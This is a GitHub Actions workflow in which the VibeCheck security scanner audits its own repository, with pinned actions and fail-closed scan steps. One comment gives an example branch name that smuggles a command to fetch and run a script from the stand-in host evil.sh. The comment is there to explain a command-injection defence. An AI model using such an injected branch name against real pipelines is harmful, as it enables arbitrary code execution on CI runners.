# VibeCheck scanning itself.
#
# This is the live workflow for THIS repository — not the copy-paste template.
# The template lives in ci/github-actions.yml and uses readable version tags;
# this file pins every action to a commit SHA, because VibeCheck reports mutable
# action tags as a finding and a security tool should not exempt itself.
#
# Refresh the pins with:
#   gh api repos/<owner>/<repo>/git/ref/tags/<tag> -q .object.sha
name: VibeCheck Security

on:
  push:
    branches: [main]        # PR runs cover branches; avoids double-running
  pull_request:
  workflow_dispatch:        # manual run

permissions:
  contents: read            # job-level grants below add only what each job needs

jobs:
  # The script's own behaviour: lint + the fail-closed contract (tests/vibecheck.bats).
  # Separate job so "the gate's code is broken" is never confused with "the gate
  # found something". Needs no scanners, network, or API key.
  script-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1   # v7.0.1
        with:
          persist-credentials: false   # nothing here pushes; keep the token off disk

      - name: shellcheck (warning and above)
        # Preinstalled on ubuntu-latest.
        run: shellcheck --version && shellcheck -S warning vibecheck.sh

      - name: Install bats + jq
        run: sudo apt-get update -qq && sudo apt-get install -y -qq bats jq

      - name: bats - fail-closed contract
        run: bats tests/vibecheck.bats

  vibecheck:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write    # required to upload SARIF to Code Scanning (this job only)
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1   # v7.0.1
        with:
          fetch-depth: 0    # full history for secret scanning
          persist-credentials: false   # the scan reads local history only; no push

      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0   # v7.1.0
        with:
          python-version: "3.12"

      - name: Install semgrep + zizmor
        # zizmor audits this repository's own workflows (pass 4b).
        run: pipx install semgrep && pipx install zizmor==1.32.0

      - uses: aquasecurity/setup-trivy@81e514348e19b6112ce2a7e3ecbafe19c1e1f567   # v0.3.1
        with:
          version: v0.69.3      # pinned: an unpinned tool changes results without a commit

      - name: Install jq
        # Hard requirement: VibeCheck parses all scanner output as JSON.
        # Present on ubuntu-latest today; installed explicitly so a runner image
        # change cannot turn this into a confusing mid-scan failure.
        run: jq --version || { sudo apt-get update -qq && sudo apt-get install -y -qq jq; }

      - name: Verify the rule packs (semgrep --test)
        # The AI/SSRF/resource/extra rule packs are only trustworthy if their
        # fixtures prove they fire on the vulnerable case and stay quiet on the
        # safe one. 35 rules, checked against tests/ai-fixtures/.
        run: semgrep --test --config rules/ tests/ai-fixtures

      - name: Install gitleaks (pinned release, download-to-file)
        run: |
          v=8.30.1
          curl -sSfL -o /tmp/gitleaks.tar.gz \
            "https://github.com/gitleaks/gitleaks/releases/download/v${v}/gitleaks_${v}_linux_x64.tar.gz"
          sudo tar -xzf /tmp/gitleaks.tar.gz -C /usr/local/bin gitleaks
          gitleaks version

      # Exit codes: 0 clean · 1 findings at/above threshold · 2 usage error
      #             3 a pass could not complete (fail-closed)
      #
      # --semgrep-config p/ci is pinned deliberately: `auto` resolves rulesets
      # from the registry per-run, so a registry change could alter results (or,
      # under fail-closed, redden the build) without a commit here.
      #
      # --skip-deps is explicit and recorded in the report: this repo is a bash
      # script with no dependency manifest, so there is nothing to resolve. It is
      # a stated decision rather than a silent gap.
      #
      # Pull requests gate on what they introduce (--diff); pushes to main run a
      # full scan so pre-existing findings never accumulate unexamined. The
      # checkout above uses fetch-depth: 0, so the base ref exists locally — with
      # a shallow clone the ref would be missing and VibeCheck would exit 3
      # rather than silently gate on nothing.
      # base_ref goes through an intermediate env var rather than ${{ }} directly
      # in run:. Branch names are attacker-controlled on fork pull requests, so
      # interpolating one into the shell is a command-injection vector — a branch
      # named `main"; curl evil.sh | sh; "` would execute on the runner.
      # (VibeCheck flagged this in its own workflow on PR #3.)
      - name: Run VibeCheck on itself (PR — changed files only)
        if: github.event_name == 'pull_request'
        env:
          BASE_REF: ${{ github.base_ref }}
          GH_TOKEN: ${{ github.token }}   # zizmor online audits (known-vulnerable actions); read-only
        # --diff implies --base, so vibecheck.yml / .vibecheckignore / the
        # baseline are read from the base branch. Without that, a pull request
        # could commit config that suppresses its own findings.
        run: ./vibecheck.sh --fail-on high --semgrep-config p/ci --skip-deps
                            --no-review --no-pdf --exclude tests
                            --diff "origin/$BASE_REF"

      - name: Run VibeCheck on itself (full scan)
        if: github.event_name != 'pull_request'
        env:
          GH_TOKEN: ${{ github.token }}   # zizmor online audits (known-vulnerable actions); read-only
        run: ./vibecheck.sh --fail-on high --semgrep-config p/ci --skip-deps --no-review --no-pdf --exclude tests

      # Uploaded even when the gate fails, so findings reach the Security tab.
      - name: Upload SARIF to Code Scanning
        uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63   # v4.38.0
        if: always()
        with:
          sarif_file: vibecheck-report/vibecheck.sarif
          category: vibecheck

      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9   # v7.0.2
        if: always()
        with:
          name: vibecheck-report
          path: vibecheck-report/
